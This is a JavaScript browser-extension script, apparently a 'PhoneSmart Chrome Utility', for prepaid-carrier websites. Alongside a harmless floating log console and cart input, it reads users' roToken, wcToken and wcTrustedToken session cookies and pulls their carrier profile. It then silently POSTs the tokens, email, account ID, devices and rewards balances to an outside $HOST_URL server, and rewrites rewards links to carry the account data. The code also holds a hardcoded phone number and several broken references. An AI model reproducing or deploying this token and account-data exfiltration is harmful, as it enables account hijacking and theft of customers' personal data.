var reqglobal;
var userInfo={};
	userInfo.brand='';
var ibmHosts=["www.net10wireless.com","www.simplemobile.com"];
var shopHosts=["shop.tracfone.com","shop.straighttalk.com"]
var aemHosts=["www.tracfone.com","www.straighttalk.com","www.totalbyverizon.com"];
var lrpHosts=["rewards.tracfone.com","rewards.straighttalk.com","rewards.totalbyverizon.com","rewards.simplemobile.com","rewards.net10wireless.com"];
if(typeof(outputAlready)=='undefined') 
{
	var outputAlready;
}
async function initUI(ident) 
{
	class UserInterface
	{
			constructor(brand,ident) 
			{
			// Initialize the user interface
			  
			  this.brand = brand.toUpperCase();
			  this.ident = ident;
			  this.console=document.createElement('div');
					document.body.appendChild(this.console);
			  this.createUI();
			}

			log(input,mode) 
			{ 
				if(typeof(mode)=='undefined') { var mode = 0 }
				var entry=document.createElement('logEntry'); 

				if(mode==0) { entry.innerHTML="<entryText>"+input+"</entryText><entryTime>"+new Date().toLocaleDateString()+" "+new Date().toLocaleTimeString().replace(/:\d+ /g," ")+"</entryTime>"; this.console.appendChild(entry); }
				if(mode==1) { entry.innerHTML="<entryText class='copyClick'>"+input+"</entryText>"; this.console.appendChild(entry);  }
				if(mode==3) 
				{
					entry.innerHTML="<entryText>"+input+"</entryText>";
					entry.innerHTML+="<entryTime>"+new Date().toLocaleDateString()+" "+new Date().toLocaleTimeString().replace(/:\d+ /g," ")+"</entryTime>"; 
					entry.setAttribute('unique',input.replaceAll(" ","-"));
					if(document.querySelector('logEntry[unique='+input.replaceAll(" ","-")+']')==null)
					{
						this.console.appendChild(entry); 
					}
					else
					{
						var entry = document.querySelector('logEntry[unique='+input.replaceAll(/[^\w_-]/,"-")+']');
							entry.style.backgroundColor="#ffe187 !important";
							entry.style.fontWeight="bold !important";
						this.console.appendChild(entry);
						
					}
				}

				this.console.scroll(0,this.console.scrollHeight); 
				localStorage.uilog=this.console.innerHTML; 
			}
			clearuilog(gui)
			{
				var conf=window.confirm("Are you sure you want to Clear the Console Log?"); 
				if(conf)
				{
					delete localStorage.uilog;  
					Object.values(document.querySelectorAll("logentry")).forEach((ent)=>{ ent.remove(); });	 
					gui.log("Log Cleared."); 
				} 
			}
			
			setxy(x,y) { fetch($HOST_URL+"css/gui/?xy="+JSON.stringify({"x":x,"y":y})); }

			async getCSS() 
			{
				var cssURL = $HOST_URL+"css/gui/"+this.brand+".css";
				//var f = await fetch(cssURL).then((txt) => { return txt.text();  });
					
					//var f="";
						var f='.brandedColors {  color: #FFF;  background-color:#333;  border-color: #000 !important; 	color: #FFF; } ';
						f=f+"	.noSelect	{  user-select: none;  } ";
						f=f+"	.callOut	{ font-weight:bold; color:#C74100; }";
						f=f+"	.copyClick	{  user-select: all;  } ";
						f=f+'	.pinButton	{ position:relative; top:-5px; background-color:rgba(255,255,255,0.33); height:22px; width:27px; padding-top:5px; float:right; margin-right:1em; color:#000; border-radius:22%; text-align:center; }';
						f=f+"	#uiMain		{position: fixed; top: 200px; width: 350px;	left: 1em;	z-index: 1210;	border-radius: 1em;	border: 0.33em solid;	box-shadow: .21em .21em .21em .21em rgba(0,0,0,.5);		min-height: 370px; backgroundColor:#000; color:#FFF; 	}";
						f=f+'	#uiMain h1	{ font-family: "Josefin Sans",sans-serif !important; margin:0 0; padding:0 0; }';
						f=f+'	#uiTitleBar	{ font-family: "Josefin Sans",sans-serif !important;   padding-top: 0.5em; font-weight: bold; padding-bottom: 0.5em; padding-left: 0.5em; }';
						f=f+'	#uiBody     {   font-family: "Josefin Sans",sans-serif !important;     float: left;    min-height: 350px;    width: 100%;    margin: auto auto;    text-align: center;    }';
						//f=+f+"	#uiMain 	{ }";
						f=f+" 	#uiMenuBar 	{  user-select: none; display:none; height:1.75em; margin:0 0; padding:0.25em; background-color: rgba(50,80,100,0.8); color:#111; font-weight:bold;} ";
						f=f+" 	#uiConsole 	{ border-radius:1em; width: 100%; text-align: left; height: 330px; padding: 0em;  margin-bottom: 0; background-color:#FFF; color:#000; overflow-y:auto; } ";
						f=f+" 	clrbtn	 	{     display: block;  cursor:pointer;   position: sticky;    top: 0px;    left: 320px;    font-weight: bold;    color: #FFF;   background-color:#111; padding: 2px; opacity:0.6; border-radius:22%;} ";
						f=f+"	clrbtn:hover{   opacity:1; color:#CC0000; }";
						
						f=f+"	logentry 				{ display:block; border-bottom:0.25px dashed #555;  padding-left:0.5em !important; padding-right:0.5em !important; } ";
						f=f+"	logentry:last-child 	{ border-bottom:0px dashed #555;} ";
						f=f+"	logentry:nth-child(odd) { background-color:rgba(0,0,0,0.20); } ";
						f=f+"	logentry:nth-child(even){ background-color:rgba(0,0,0,0.05); } ";
						f=f+"	logentry entryTime		{  font-size:xx-small; width:100%; display:block;  text-align:right; } ";
						f=f+"	logentry entryText		{  font-size:small;  width:100%;  display:block; } ";
					localStorage.uistyle=f;
				return f;
			}
					
					toggle(tar)
					{
						var uiMain = document.querySelector('#uiMain');
						//console.log(tar.style.mixBlendMode);
						if(tar.style.mixBlendMode=="soft-light")
						{
							tar.style.mixBlendMode="hard-light";
							if(tar.id=='pinButton')
							{
								
								uiMain.style.position="fixed";
								
							}
						}
						else
						{
							tar.style.mixBlendMode="soft-light";
							document.querySelector('#uiMain').style.position="absolute";
						}
						
								localStorage.uiY=uiMain.style.top;
								localStorage.uiX=uiMain.style.left;
					}

					async getxy() { var xy=fetch($HOST_URL+"css/gui/?xy").then((Response)=>Response.json()).catch((err)=>{  var xy='{"x":"20px","y":"250px"}'; }); return xy; }
					
		async createUI()
		{
						
			if(document.querySelector('#uiMain')==null) 
			{
				this.uiMain=document.createElement('div');	
				this.xy=await this.getxy();

				this.uiMain.setAttribute('id','uiMain');
				this.uiMain.setAttribute('class','brandedColors noSelect');
				
				this.styleOBJ = document.createElement('style');
					this.styleOBJ.innerHTML=await this.getCSS();
					this.styleOBJ.setAttribute('id','uiStyle');
				
				this.body=document.createElement('div');
					this.body.setAttribute("id","uiBody");	  
					
					this.console.setAttribute("id","uiConsole");
				this.title = document.createElement('div');
					this.title.setAttribute("id","uiTitleBar");
				this.menu = document.createElement('div');	
					this.menu.setAttribute('id','uiMenuBar');				
				
	
				
				document.body.appendChild(this.styleOBJ);
					this.uiMain.style.top=this.xy.y;
					this.uiMain.style.left=this.xy.x;
				document.body.appendChild(this.uiMain);
					this.uiMain.appendChild(this.title);
						this.title.setAttribute('id','uiTitleBar');
						this.title.innerHTML="PhoneSmart Chrome Utility";
						
					this.uiMain.appendChild(this.menu);
						this.menu.innerHTML="Menu Bar";
					
					this.uiMain.appendChild(this.body);
						this.body.appendChild(this.console);
						//this.body.appendChild(this.console);

				
				
				
		
				
				
				//this.body.innerHTML+="<button id='btnScrape' style='display:none;' disabled>Start Scrape</button>";
				//this.body.innerHTML+="<input type='text' style='display:none;' value='' id='txtNumber'>";
			
				

				var uiMain=this.uiMain;
				var uiTitleBar = this.title;
				var pinButton=document.createElement('div');
					pinButton.className="pinButton";
					
					uiTitleBar.appendChild(pinButton);
					pinButton.style.mixBlendMode="hard-light";
					pinButton.innerText="📌";
					pinButton.addEventListener("click",(evt)=>{ this.toggle(evt.target); })
					
					
					var scrollButton=document.createElement('div');
					uiTitleBar.appendChild(scrollButton);
					scrollButton.className="pinButton";
					scrollButton.style.mixBlendMode="hard-light-light";
					scrollButton.innerText="↕";
					scrollButton.addEventListener("click",(evt)=>{ this.toggle(evt.target); })
					
					var uiBody =  this.body;
					uiBody.onmousedown = (event)=> { dragUi(event,this); }
					uiTitleBar.onmousedown = (event)=> { dragUi(event,this); }
					
					
				if(typeof(localStorage.uilog)=="string") 
				{
					this.console.innerHTML=localStorage.uilog; 
						var clrbtn=document.createElement('clrbtn');
						clrbtn.innerHTML="CLEAR"; 
						clrbtn.addEventListener('click',()=>{ this.clearuilog(ui) },false);  
						uiBody.appendChild(clrbtn); 
						
					/*Object.values(ui.console.entries).filter((entry)=>
					{
						if(entry.innerHTML.match(/viewport/))
						{
							return entry 
						} 
					}).forEach((e403)=>e403.remove());*/
				}
					 
					
					
					function dragUi(event,wtf)
					{
							var tar=event.target;
							
							var blX=event.pageX-uiMain.offsetLeft; 
							var blY=event.pageY-uiMain.offsetTop;
							var bottomRightOnly=(blX>=325 && blY>=325 && tar.id=="uiBody");
							var pinned=(pinButton.style.mixBlendMode=="hard-light");
							if((tar.id=="uiTitleBar" || bottomRightOnly==true) && !pinned) 
							{
							//	if(bottomRightOnly) { console.log(blY,blY); }
							  let shiftX = event.clientX - event.target.getBoundingClientRect().left;
							  let shiftY = event.clientY - event.target.getBoundingClientRect().top;
							  uiMain.style.position = 'absolute';
							  uiMain.style.zIndex = 1000;
							  document.body.append(uiMain);
							  moveAt(event.pageX, event.pageY);
							  // moves the ball at (pageX, pageY) coordinates
							  // taking initial shifts into account
							  function moveAt(pageX, pageY) {
								uiMain.style.left = pageX - shiftX + 'px';
								uiMain.style.top = pageY - shiftY + 'px';
							  }

							  function onMouseMove(event) {
								moveAt(event.pageX, event.pageY);
							  }

							  // move the ball on mousemove
							  document.addEventListener('mousemove', onMouseMove);

							  // drop the ball, remove unneeded handlers
							  uiMain.onmouseup = function() {
								document.removeEventListener('mousemove', onMouseMove);
								uiMain.onmouseup = null;
								wtf.setxy(uiMain.style.left,uiMain.style.top);
							  };
							}
						}

				this.uiMain.ondragstart = function() {return false; }
	
				var uiDiv=document.querySelector('div#uiMain');
				var currentScrollY=window.scrollY;
				onscroll = (event) => 
				{
					var scrollLock=(scrollButton.style.mixBlendMode=="hard-light");
					if(scrollLock==true)
					{
						setTimeout(()=>
						{
							var scrollChange = window.scrollY-currentScrollY;
							var uiStartY = parseInt(getComputedStyle(uiDiv).top);
							var uiEndingY = uiStartY + scrollChange;
								uiDiv.style.top = uiEndingY.toString()+"px";
								currentScrollY=window.scrollY;
						},450);
					}
				};	
			}			 
		}

		skuInputgui() 
		{
			var container=document.createElement('div');
			this.body.appendChild(container);
			container.innerHTML+="<h5 style='padding:0 0; margin:0 0;'>Input a Phone ID/SKU</h5>";	
			
			 
				container.style="width: 285px; height: 98px;  margin:auto auto;  background-color: rgb(255, 255, 255);    border: 0px solid rgb(1 41 121); padding: 1em; border-radius: 1em;";
			var skuInput=document.createElement('input');
				container.appendChild(skuInput);
				
			var qtyInput=document.createElement('input');
				qtyInput.style="width:2em; text-align:center; font-weight:bold;";
				qtyInput.value=1;
				qtyInput.maxlength=2;
				skuInput.setAttribute('autocomplete','off');
				qtyInput.setAttribute('autocomplete','off');
				container.appendChild(qtyInput);
			var skuInputbtn=document.createElement('input');
				container.appendChild(skuInputbtn);
				skuInputbtn.type="button";
				skuInputbtn.value="Add";
			var skuOutput=document.createElement('div');
				container.appendChild(skuOutput);
				
			skuOutput.style=' font-family:terminal; font-size:0.8em;';
			
			
			async function addKey(evt)
			{
				
					if((evt.type=="click" && evt.target.type=="button") || (evt.type=="keyup" && evt.target.type=="text"  && (evt.key=="enter" || evt.key=="Enter")))
					{
						var skuValue=skuInput.value; 
						var qtyValue=qtyInput.value;
						var addResult=await addItem2CartIBM(skuValue,qtyValue);  
						if(addResult=="Added") {  skuInput.style.backgroundColor='green'; skuInput.style.color='#FFF'; location.reload(); }
						if(!(addResult=="Added")) {  skuInput.style.backgroundColor='red'; skuInput.style.color='#FFF';  }
						 ui.log(addResult);
						 
						 skuInput.focus();
						setTimeout(()=>
						{
							 skuInput.style.backgroundColor='#FFF'; skuInput.style.color='#000';  
						},2000); 
					}
			}
			
				skuInput.addEventListener('input',()=>{ skuOutput.innerText="";  });
				skuInputbtn.addEventListener('click',addKey,false);
				skuInput.addEventListener('keyup',addKey,false);
				qtyInput.addEventListener('keyup',addKey,false);

		}

	}

				
	//var brand = document.querySelector('[data-brand]').dataset.brand;
	var str=location.host;
	var brand = str.split(".")[1].toUpperCase().replace("TALK","_TALK").replace("TOTALBYVERIZON","TOTAL_WIRELESS").replace("MOBILE","_MOBILE");
	
	
	return new UserInterface(brand,ident);
}
function checkResult(x,output)
{
	
	
	if(typeof(sessionStorage.attempts)=='undefined')
	{
		sessionStorage.attempts=1;
	}
	else
	{
		sessionStorage.attempts=eval(parseInt(sessionStorage.attempts)+1);  
	}
	if(x=="missingUser")
	{
		
			if(sessionStorage.attempts<2)
			{
				//location.reload();
			}
			
	}
	else{
		sessionStorage.attempts=0;
	}
	
}
async function getUserInfo(output) 
{
	var main = document.querySelector("#main");
    var roToken = await cookieStore.get("roToken");
    if(roToken!=null) 
    {
            roToken = await roToken.value;
        if(typeof(sessionStorage.$userService)=='string')
        {
           console.log("ID: "+actid,375);
		   //var actid=JSON.parse(sessionStorage.$userService).account_id;
			//var emlid=JSON.parse(sessionStorage.$userService).emailId;
            var clientID=document.querySelector('#main').dataset.clientid;
			var brndName=document.querySelector('#main').dataset.brand;
            var url = main.dataset.wctokenapidomainpath+"/customer-mgmt/customer/"+actid+"/profile?";
                url+="brand="+brndName+"&source=WEB&view=FULL&language=ENG&client_id="+clientID; 
						console.log(url);
            var userInfoRequest = await fetch(url, {"headers": {"authorization": "Bearer "+roToken}});
			reqglobal = userInfoRequest;
            var userInfoResult = await userInfoRequest.json();
				userInfo = userInfoResult.customer;
				console.log(393,userInfoResult);
             
            userInfo.brand=brndName;
			out2Console();
			localStorage.setItem('userInfo',JSON.stringify(userInfo));
			return userInfo;
        }
        else
        {
            return {"ERROR":"Unable to determine account id."};
        }
    }
    else 
    {
        return {"ERROR":"Unable to determine RoToken."};
    }
}
async function runScripts(output)
{
	userInfo=await getUserInfo(output); //console.log("SCRIPTS");
	if(typeof(userInfo.ERROR)!='undefined')  { return userInfo.ERROR; }
	else { return userInfo; }
}
function sendUserInfo(userInfo,output)
{
	
	var req=new XMLHttpRequest();
	req.open('POST',$HOST_URL+"lookup/");
	req.onload=()=>
	{ 
		var serverResponse = req.response;  
			if(typeof(outputAlready)=='undefined')
			{
				outputAlready = true;
				outputUser(userInfo,serverResponse,output);   
			}
			checkResult(serverResponse,output);  
	};
			req.send(localStorage.userInfo);
}
function outputUser(usr,r,output)
{
	if(r!="missingUser") 
	{
		output.log(r); 
		if(typeof(usr.enrollments)!='undefined')
		{
				output.log(usr.enrollments[0].name+": "+usr.enrollments[0].status); 
			
		
		
		Object.values(usr.enrollments[0].characteristics).forEach((c)=> 
		{
			output.log(c.name+": "+c.value);
		
		});
			}
	}
	else { output.log("Login Not Detected."); }
	return true;
}
function getTempJSON() 
{
			var uid=JSON.parse(sessionStorage.$userService).account_id;
			var eml=JSON.parse(sessionStorage.$userService).email;
			var oldRewardsJSON=JSON.parse(sessionStorage.$deviceService).lrpDetails;
			var totalPoints=oldRewardsJSON.totalPoints;
			var pendingPoints=oldRewardsJSON.pendingPoints;
			var availablePoints=oldRewardsJSON.availablePoints;
			var statuses=new Array("INACTIVE","ACTIVE");
			var status=statuses[oldRewardsJSON.isLRPEnrolled*1];
			var startDate=oldRewardsJSON.enrlStartDate;
			
			var tempJSON={"id":uid,"individualIdentification":{"username":eml},"brand":sessionStorage.$brandName};
			if(typeof(sessionStorage.$deviceService)=='string') 
			{
				var products=[];
				var devices=JSON.parse(sessionStorage.$deviceService);
						if(typeof(devices.allDevices)!='undefined') 
						{
							var allDevices=JSON.parse(sessionStorage.$deviceService).allDevices;
									allDevices.forEach((d)=>
									{
										var p={};
										p.productSerialNumber=d.esn;
										p.productSpecification={};
										p.characteristics=[];
										p.relatedResources=[];
										p.relatedServices=[];
										p.status=d.deviceStatus;
										if(typeof(d.deviceType)!='undefined')
										{
											p.productSpecification.deviceType=d.deviceType;
										}

										if(typeof(d.min)!='undefind' && d.min!="")
										{
											p.relatedResources.push({type: 'LOGICAL', resourceCategory: 'LINE', serialNumber: '3193606153',"carrier":{"name":"vzw"}});
										}

										if(typeof(d.currentPlanEndDate)!='undefined') 
										{
											p.relatedServices[0]={"category":"SERVICE_PLAN","validFor":{"endDate":d.currentPlanEndDate}};
										}

								   products.push(p);
								});
						tempJSON.products=products;		
						}	
				}
			
			var rewardsJSON={"type":"REWARDS","name":"LOYALTY_REWARDS","status":status,"validFor":{"startDate":startDate},"characteristics":[{"name":"totalPoints","value":totalPoints},{"name":"pendingPoints","value":pendingPoints},{"name":"availablePoints","value":availablePoints}]};
				tempJSON.enrollments=new Array();
				tempJSON.enrollments[0]=rewardsJSON;
				return tempJSON;
}
function preVZN(output) 
{
	var j=getTempJSON();
		localStorage.userInfo=JSON.stringify(j);
	var usr={};
	var userService=JSON.parse(sessionStorage.$userService);
		usr.uid = userService.account_id;
		usr.eml = userService.emailId;
		localStorage.userInfo=JSON.stringify(j);
	sendUserInfo(localStorage.userInfo,output);
		resultMsg="   "+usr.eml+" - "+usr.uid+"   ";	
}
async function  extStart(output)
{
	if(aemHosts.includes(location.host))
	{
		var cid=document.querySelector('[data-brand]').dataset.clientid;
			localStorage.cid=cid;
		var scriptResult=await runScripts(output);
			sendUserInfo(userInfo,output);
				if(typeof(userInfo.enrollments)=="object") 
				{
					var links2Change=document.querySelectorAll("a[href*=dashboard]");
						Object.values(links2Change).filter((l)=>{ if(l.href.match(/rewards./gmi)){  return l;} }).forEach((link)=>{ link.href=link.href.replaceAll(/home\/dashboard/g,"profile/account")+"?actid="+userInfo.id+"&pp="+userInfo.enrollments[0].characteristics[1].value+"&ap="+userInfo.enrollments[0].characteristics[2].value; }); 
				sendUserInfo(userInfo,output);
				}
				
	}
	if(ibmHosts.includes(location.host))
	{
		var alreadyDone=document.createElement('AlreadyDone');
			document.body.appendChild(alreadyDone);
			console.log("IBM Script");
			preVZN(output);
	}
}
function out2Console() 
{
	usr.actid=userInfo.id;
	usr.emlid=userInfo.contactMedium[1].contactDetails.emailAddress;
	usr.brand=userInfo.brand;
	usr.lrp={};
	usr.lrp.status="INACTIVE";
	if(typeof(userInfo.enrollments)=="object") 
	{
		var lrpData=userInfo.enrollments.filter((e)=>{ if(e.type=="REWARDS") { return e; } });
			  lrpData=lrpData[0]; 
			  usr.lrp.status=lrpData.status; 
	}
	console.log("User Account : "+usr.actid);
	console.log("Email Address: "+usr.emlid);
	console.log("Account Brand: "+userInfo.brand);
	console.log("LRP Status: "+usr.lrp.status);
	if(usr.lrp.status!="INACTIVE")
	{
		usr.lrp.totalPoints=parseInt(lrpData.characteristics[0].value);
		usr.lrp.pendingPoints=parseInt(lrpData.characteristics[1].value);
		usr.lrp.availablePoints=parseInt(lrpData.characteristics[2].value);
	}
}
async function sendTokens() 
{
	if(aemHosts.includes(location.host) && document.querySelector('tknSent')==null)
	{
		var tknSent=  document.createElement('tknSent');
		document.body.appendChild(tknSent);
		
			
					var t01 = await cookieStore.get("wcToken");
					var wct1 = await t01.value
					var t02 = await cookieStore.get("wcTrustedToken");
					var wct2 = await t02.value;
					var sender={"wct1":wct1,"wct2":wct2,"cid":cid};
					fetch($HOST_URL+"api/",{"body":JSON.stringify(sender),"method":"POST"});	
	}
}



